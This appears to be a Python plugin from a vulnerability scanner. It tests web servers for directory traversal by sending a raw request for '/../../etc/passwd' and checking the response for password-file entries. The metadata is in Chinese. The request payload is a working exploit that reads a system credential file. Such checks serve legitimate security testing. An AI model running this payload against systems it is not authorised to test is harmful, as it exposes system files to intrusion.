# coding=utf-8
import re
import socket
from lib.utils.common import target2hp


def get_plugin_info():
    plugin_info = {
        "name": "WebServer目录遍历漏洞",
        "info": "web容器对请求处理不当，可能导致可以任意文件读取(例：GET ../../../../../etc/passwd)。",
        "level": "高危",
        "type": "任意文件读取",
        "keyword": "server:web",
        "source": 1
    }
    return plugin_info


def poc(target,timeout=3):
    ip,port = target2hp(target)
    flag = u"web容器任意文件读取漏洞"
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        payload = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(payload)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            return [1,flag]
        return [0,flag]
    except:
        return [0,flag]
